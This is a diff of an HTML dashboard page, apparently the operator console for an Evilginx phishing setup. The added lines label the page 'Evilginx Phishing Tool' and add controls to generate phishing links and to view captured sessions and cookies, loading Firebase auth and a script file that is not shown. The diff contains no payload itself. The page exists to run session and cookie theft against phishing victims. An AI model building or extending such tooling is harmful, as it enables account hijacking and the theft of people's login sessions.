@@ -6,26 +6,26 @@
     <title>Dashboard</title>
     <link rel="stylesheet" href="styles.css">
 </head>
-<body>
-    <h1>Dashboard</h1>
+<body onload="checkAuthStatus()">
+    <h1>Welcome to Your Dashboard</h1>
     <button onclick="logout()">Logout</button>
 
-    <div class="dashboard-buttons">
-        <button onclick="generateLink()">Generate Link</button>
-        <button onclick="fetchCapturedSessions()">Captured Sessions</button>
-        <button onclick="fetchCookies()">Cookies</button>
-    </div>
+    <h2>Evilginx Phishing Tool</h2>
+    <button onclick="generateLink()">Generate Link</button>
+    <p id="generated-link"></p>
 
-    <div id="data-display"></div>
+    <button onclick="getCapturedSessions()">View Captured Sessions</button>
+    <pre id="captured-sessions"></pre>
 
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js"></script>
+    <button onclick="getCookies()">View Captured Cookies</button>
+    <pre id="cookies-data"></pre>
 
-    <!-- Firebase Config -->
+    <!-- ✅ Load Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-auth.js"></script>
+
+    <!-- ✅ Load Firebase Config & Script -->
     <script src="firebase-config.js"></script>
-
-    <!-- Main Script -->
     <script src="script.js"></script>
 </body>
 </html>
